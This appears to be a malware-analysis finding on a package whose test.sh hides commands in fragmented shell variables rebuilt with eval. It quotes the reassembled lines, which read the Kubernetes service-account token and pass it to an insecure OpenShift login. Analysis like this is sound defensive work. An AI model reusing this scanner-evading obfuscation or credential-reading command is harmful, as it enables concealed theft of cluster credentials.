details: This package ships an auxiliary bash script, test.sh, that hides its real payload from substring scanners: two commands are split across 17 single-character shell variables (e.g. d='exp', e='ort DEBUG_F', f='ILE=$(cat /v', … u='erify') and rebuilt at the top of the script with eval "$d$e$f$g$h$i$j$k$l$m" / eval "$n$o$p$q$r$s$t$u". The reassembled lines are: export DEBUG_FILE=$(cat /var/run/secrets/kubernetes[.]io/serviceaccount/token 2>/dev/null) and./oc login --token=$DEBUG_FILE --server=$SERV --insecure-skip-tls-verify — i.e. it reads the local Kubernetes service-account credential into an environment variable and passes it to an OpenShift login with TLS verification disabled. The script is not wired into any lifecycle hook: package.json declares only a manual "send" script running requester.js, a plain user-driven HTTP/DNS diagnostic CLI (--domain/--port/--path/--method). No C2 host, fixed endpoint or exfiltration destination exists anywhere in the package — the --server value is supplied by the caller and is never set inside the tarball — and no environment or token collection is sent off-host. Files of interest: package/test.sh (fragmented eval payload), package/requester.js (user-directed HTTP client). The behaviour is real and concealed, but no remote collection or automatic execution is present.
